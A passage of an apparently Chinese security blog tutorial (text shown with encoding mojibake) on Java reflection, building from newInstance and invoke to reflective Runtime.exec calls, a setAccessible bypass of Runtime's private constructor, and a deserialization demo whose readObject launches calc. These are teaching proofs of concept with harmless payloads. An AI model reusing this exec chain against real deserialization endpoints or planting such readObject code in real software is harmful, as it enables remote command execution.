<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="8.png" loading="lazy"></p><h3 id="åå°„åˆ›å»ºç±»å¯¹è±¡"><a href="#åå°„åˆ›å»ºç±»å¯¹è±¡" class="headerlink" title="åå°„åˆ›å»ºç±»å¯¹è±¡"></a>åå°„åˆ›å»ºç±»å¯¹è±¡</h3><p>åœ¨å‰é¢æˆ‘ä»¬è·å–äº†Classå¯¹è±¡ï¼Œä¹‹åå±•ç¤ºäº†ä¸€ç³»åˆ—è·å–æˆå‘˜å˜é‡ã€æˆå‘˜æ–¹æ³•å’Œæˆå‘˜å‡½æ•°çš„æ–¹å¼åï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥é€šè¿‡åå°„æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬æˆ‘ä»¬ä½¿ç”¨Classå¯¹è±¡çš„newInstance()æ–¹æ³•æ¥è¿›è¡Œåˆ›å»ºç±»å¯¹è±¡ã€‚</p><p>ä½¿ç”¨çš„æ–¹å¼ä¹Ÿç‰¹åˆ«ç®€å•ï¼Œåªéœ€è¦é€šè¿‡fornameæ–¹æ³•è·å–åˆ°çš„classå¯¹è±¡ä¸­è¿›è¡ŒnewInstanceæ–¹æ³•åˆ›å»ºå³å¯ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.MethodTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ›å»ºClasså¯¹è±¡</span>            <span class="token class-name">Object</span> m1 <span class="token operator">=</span>  c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ›å»ºç±»å¯¹è±¡</span></code></pre><p>è¿™é‡Œä¹Ÿé¡ºä¾¿è¯´ä¸‹invokeæ–¹æ³•ï¼Œinvokeæ–¹æ³•ä½äºjava.lang.reflect.Methodç±»ä¸­ï¼Œç”¨äºæ‰§è¡ŒæŸä¸ªçš„å¯¹è±¡çš„ç›®æ ‡æ–¹æ³•ã€‚<br>ä¸€èˆ¬ä¼šå’ŒgetMethodæ–¹æ³•é…åˆè¿›è¡Œè°ƒç”¨ã€‚</p><p>ä½¿ç”¨ç”¨æ³•</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span></code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç±»çš„å®ä¾‹ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç›¸åº”å‡½æ•°ä¸­çš„å‚æ•°</p><p>objï¼šä»ä¸­è°ƒç”¨åº•å±‚æ–¹æ³•çš„å¯¹è±¡ï¼Œå¿…é¡»æ˜¯å®ä¾‹åŒ–å¯¹è±¡</p><p>argsï¼š ç”¨äºæ–¹æ³•çš„è°ƒç”¨ï¼Œæ˜¯ä¸€ä¸ªobjectçš„æ•°ç»„ï¼Œå‚æ•°æœ‰å¯èƒ½æ˜¯å¤šä¸ª</p><p>ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œinvokeæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°å¹¶ä¸æ˜¯å›ºå®šçš„ï¼š</p><p><strong>å¦‚æœè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ˜¯æ™®é€šæ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç±»å¯¹è±¡ï¼›</strong></p><p><strong>å¦‚æœè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç±»ï¼›</strong></p><p>å°†æˆ‘ä»¬çš„çŸ¥è¯†è¿›è¡Œæ•´åˆå½’çº³ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸ªå®Œæ•´çš„å°ä¾‹å­ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reflectMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"åå°„æµ‹è¯•æˆåŠŸ!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ReflectTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ›å»ºClasså¯¹è±¡</span>            <span class="token class-name">Object</span> m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ›å»ºç±»å®ä¾‹å¯¹è±¡</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"reflectMethod"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è·å–reflectMethodæ–¹æ³•</span>            method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è°ƒç”¨ç±»å®ä¾‹å¯¹è±¡æ–¹æ³•</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="9.png" loading="lazy"></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>ä¸Šé¢æˆ‘ä»¬è®²è¿°äº†åå°„æœºåˆ¶æµç¨‹æ¦‚å¿µå’ŒåŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼Œä»Classå¯¹è±¡è·å–ï¼Œåˆ°è·å–æˆå‘˜å˜é‡ã€æˆå‘˜æ–¹æ³•å’Œæ„é€ å‡½æ•°ï¼Œæ¥ç€æ˜¯newInstanceåˆ›å»ºç±»å¯¹è±¡å’Œinvokeæ–¹æ³•ï¼Œæœ€åæ˜¯ä¸€ä¸ªç®€å•åå°„ä¾‹å­çš„ç»„æˆã€‚ç›¸ä¿¡å¤§å®¶éƒ½å¯¹åå°„æœ‰ä¸ªå¾ˆæ¸…æ™°çš„äº†è§£å’Œè®¤è¯†ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬å¹³æ—¶æ¼æ´æµ‹è¯•ä¸­ï¼Œå¦‚ä½•ä½¿ç”¨javaåå°„ä¸­å¦‚ä½•è·å–Runtimeç±»æ¥å‘½ä»¤æ‰§è¡Œæµ‹è¯•å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h3 id="åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ"><a href="#åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ"></a>åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ</h3><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆæ¨¡ä»¿å‰é¢çš„åå°„ä¾‹å­ï¼Œå°è¯•å»åå°„æ‰§è¡ŒRuntimeç±»å»å‘½ä»¤æ‰§è¡Œã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RuntimeTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> m <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="10.png" loading="lazy"></p><p>ä½†æˆ‘ä»¬å‘ç°äº†ä½¿ç”¨newInstanceäº§ç”Ÿäº†æŠ¥é”™çš„è¯ï¼Œè€Œå¾€å¾€å…¶å¯èƒ½æ˜¯ä»¥ä¸‹åŸå› æœªèƒ½å®ç°ã€‚</p><p>1ã€ä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°</p><p>2ã€ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„</p><p>ä¹‹åæˆ‘ä»¬æŸ¥çœ‹å…¶å‡ºé”™åŸå› ï¼Œjava.lang.Runtime with modifiers â€œprivateâ€ã€‚Runtimeç±»çš„æ„é€ æ–¹æ³•æ˜¯privateæƒé™ç§æœ‰çš„ï¼Œæ˜¯æ ¹æ®â€œå•ä¾‹æ¨¡å¼â€è¿›è¡Œè®¾è®¡çš„ï¼Œæˆ‘ä»¬æ— æ³•è¿›è¡Œç›´æ¥è°ƒç”¨ã€‚çœ‹æ¥æˆ‘ä»¬ä¸Šè¿°çš„åå°„æœºåˆ¶ä¹Ÿæ˜¯æœ‰é™åˆ¶çš„ï¼Œå¹¶ä¸èƒ½é¥¶è¿‡privateæƒé™çš„æ£€æŸ¥ã€‚</p><p>æ—¢ç„¶æˆ‘ç°åœ¨ä¸èƒ½ç»•è¿‡privateæƒé™çš„æ£€æµ‹ï¼Œé‚£æˆ‘å…ˆä¸ç®¡newIntanceåˆ›å»ºç±»å¯¹è±¡ï¼Œå…ˆè·å–Rumtimeç±»çš„æ–¹æ³•å…ˆè°ˆä¸ªè®¡ç®—å™¨å†çœ‹çœ‹ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹ä»£ç è¿›è¡Œç®€å•ä¿®æ”¹ä¸‹ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨getMethodä½œç”¨é€šè¿‡åå°„è·å–ä¸€ä¸ªç±»çš„æŸä¸ªç‰¹å®šçš„å…¬æœ‰æ–¹æ³•ã€‚ä¸”javaä¸­æ”¯æŒç±»çš„é‡è½½ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…é€šè¿‡å‡½æ•°åç¡®å®šä¸€ä¸ªå‡½æ•°ã€‚åœ¨è°ƒç”¨getMethodæ—¶å€™ï¼Œéœ€è¦ä¼ ç»™ä»–ä½ éœ€è¦è·å–çš„å‡½æ•°çš„å‚æ•°ç±»å‹åˆ—è¡¨ã€‚</p><p>å¦‚Runtime.execæ–¹æ³•æœ‰6ä¸ªé‡è½½ï¼š</p><p><img src="11.png" loading="lazy"></p><p>exec(String commmand)</p><p>æˆ‘ä»¬å¯ä»¥å®ç”¨æœ€ç®€å•è¿™ç§åªæœ‰ä¸€ä¸ªå‚æ•°ä¸”ç±»å‹æ˜¯Stringã€‚å®ç”¨getMethod(â€œexecâ€,String.class)è·å–Runtime.execæ–¹æ³•ï¼Œå¹¶ä¸”è·å–getRuntimeæ–¹æ³•æ¥æ‰§è¡Œã€‚</p><p><img src="12.png" loading="lazy"></p><p>ç„¶åæˆ‘ä»¬å°†è¿™æ®µä»£ç è¿›è¡Œç®€ç•¥ä¸‹ï¼Œå°±ç”Ÿæˆä»¥ä¸‹æˆ‘ä»¬å¸¸è§çš„åå°„payloadæµ‹è¯•ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è¿™é‡Œæˆ‘ä»¬è™½ç„¶æˆåŠŸæ‰§è¡Œæ–¹æ³•å¼¹å‡ºè®¡ç®—å™¨ï¼Œä½†ä»…ä»…åªæ˜¯è°ƒç”¨å…¶æ–¹æ³•å»å®ç°ã€‚è€Œæˆ‘ä»¬è¿˜æ˜¯æƒ³æ‰§è¡Œå…¶ç§æœ‰æ–¹æ³•ï¼Œé€šè¿‡newInstanceæ¥æ„é€ ä½¿ç”¨ã€‚è¿™æ ·å°±éœ€è¦æˆ‘ä»¬é€šè¿‡setAccessible(true)æ¥çªç ´è®¿é—®æƒé™çš„æ£€æŸ¥ã€‚</p><h3 id="è®¾ç½®setAccessible-true-æš´åŠ›è®¿é—®æƒé™"><a href="#è®¾ç½®setAccessible-true-æš´åŠ›è®¿é—®æƒé™" class="headerlink" title="è®¾ç½®setAccessible(true)æš´åŠ›è®¿é—®æƒé™"></a>è®¾ç½®setAccessible(true)æš´åŠ›è®¿é—®æƒé™</h3><p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æœºåˆ¶ä¸èƒ½å¯¹ç±»çš„ç§æœ‰privateå­—æ®µè¿›è¡Œæ“ä½œï¼Œç»•è¿‡ç§æœ‰æƒé™çš„è®¿é—®ã€‚ä½†ä¸€äº›ç‰¹æ®Šåœºæ™¯å­˜åœ¨ä¾‹å¤–çš„æ—¶å€™ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ï¼Œéœ€è¦å»è®¿é—®è¿™äº›å—é™çš„ç§æœ‰å­—æ®µï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨AccessibleObjectä¸Šçš„setAccessible()æ–¹æ³•æ¥å…è®¸è®¿é—®ã€‚</p><p>Java.lang.reflect.AccessibleObjectç±»æ˜¯Fieldï¼ŒMethodå’ŒConstructorç±»å¯¹è±¡çš„åŸºç±»ï¼Œå¯ä»¥æä¾›å°†åå°„å¯¹è±¡æ ‡è®°ä¸ºä½¿ç”¨å®ƒæŠ‘åˆ¶æ‘¸äººJavaè®¿é—®æ§åˆ¶æ£€æŸ¥çš„åŠŸèƒ½ï¼ŒåŒæ—¶ä¸Šè¿°çš„åå°„ç±»ä¸­çš„Fieldï¼ŒMethodå’ŒConstructorç»§æ‰¿è‡ªAccessibleObjectã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è¿™äº›ç±»æ–¹æ³•åŸºç¡€ä¸Šè°ƒç”¨setAccessible()æ–¹æ³•ï¼Œæ—¢å¯å¯¹è¿™äº›ç§æœ‰å­—æ®µè¿›è¡Œæ“ä½œã€‚</p><p>æ‰€æœ‰æˆ‘ä»¬æœ€å¼€å§‹çš„ä»£ç å†ä¿®æ”¹ç®€ç•¥ä¸‹ï¼Œå°±èƒ½æˆåŠŸå‘½ä»¤æ‰§è¡Œäº†ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RuntimeTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> c1<span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> m <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="13.png" loading="lazy"></p><h3 id="Javaååºåˆ—åŒ–æ¼æ´demo"><a href="#Javaååºåˆ—åŒ–æ¼æ´demo" class="headerlink" title="Javaååºåˆ—åŒ–æ¼æ´demo"></a>Javaååºåˆ—åŒ–æ¼æ´demo</h3><p>æœ€åç»“æŸå°±ç”¨ä¸€ä¸ªä¹‹å‰å­¦ä¹ javaåå°„çš„æ—¶å€™å­¦ä¹ çš„demoï¼Œå¦‚æœæˆ‘ä»¬åœ¨è¿›è¡Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯æ§çš„è¯ï¼Œèƒ½å¤ŸåŠ è½½æˆ‘ä»¬ä½¿ç”¨åå°„è°ƒç”¨çš„æ¶æ„å‘½ä»¤è¯­å¥çš„è¯ï¼Œåˆ™èƒ½å¤ŸæˆåŠŸè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> demo <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–æ—¶æ‰§è¡Œ</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span><span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è°ƒç”¨åŸå§‹çš„readObjectæ–¹æ³•</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span> <span class="token comment">// é€šè¿‡åå°„æ–¹æ³•æ‰§è¡Œå‘½ä»¤;</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             demo x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             operation<span class="token punctuation">.</span><span class="token function">ser</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>             operation<span class="token punctuation">.</span><span class="token function">deser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> operation<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ser</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token comment">// åºåˆ—åŒ–æ“ä½œï¼Œå†™æ•°æ®</span>            <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"object.obj"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// ObjectOutStreamèƒ½æŠŠObjectè¾“å‡ºæˆByteæµ</span>            oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åºåˆ—åŒ–å…³é”®å‡½æ•°</span>            oos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç¼“å†²æµ</span>            oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å…³é—­æµ</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token comment">// ååºåˆ—åŒ–æ“ä½œï¼Œè¯»å–æ•°æ®</span>            <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"object.obj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> x <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ååºåˆ—åŒ–çš„å…³é”®å‡½æ•°</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token 